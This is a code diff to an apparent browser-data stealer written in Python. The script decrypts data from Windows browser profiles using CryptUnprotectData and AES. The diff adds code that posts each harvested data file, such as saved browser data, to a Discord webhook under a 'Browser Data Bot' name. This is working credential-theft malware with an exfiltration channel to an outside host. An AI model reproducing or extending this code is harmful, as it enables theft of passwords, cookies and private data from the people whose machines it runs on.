@@ -4,11 +4,13 @@ import os
 import shutil
 import sqlite3
 from datetime import datetime, timedelta
-
+import requests  # Import the requests library
 from Crypto.Cipher import AES
 from win32crypt import CryptUnprotectData
 
 appdata = os.getenv('LOCALAPPDATA')
+
+webhook_url = 'WEBHOOK HERE'  # Your Discord webhook URL
 
 browsers = {
     'avast': appdata + '\\AVAST Software\\Browser\\User Data',
@@ -97,6 +99,17 @@ def save_results(browser_name, type_of_data, content):
     if content is not None:
         open(f'{browser_name}/{type_of_data}.txt', 'w', encoding="utf-8").write(content)
         print(f"\t [*] Saved in {browser_name}/{type_of_data}.txt")
+
+        # Send the data to the webhook
+        data = {
+            "username": "Browser Data Bot",
+            "content": f"**{browser_name.capitalize()} {type_of_data.replace('_', ' ').capitalize()}**\n```{content}```"
+        }
+        response = requests.post(webhook_url, json=data)
+        if response.status_code == 204:
+            print(f"\t [*] Successfully sent to webhook.")
+        else:
+            print(f"\t [!] Failed to send to webhook. Status code: {response.status_code}")
     else:
         print(f"\t [-] No Data Found!")
 
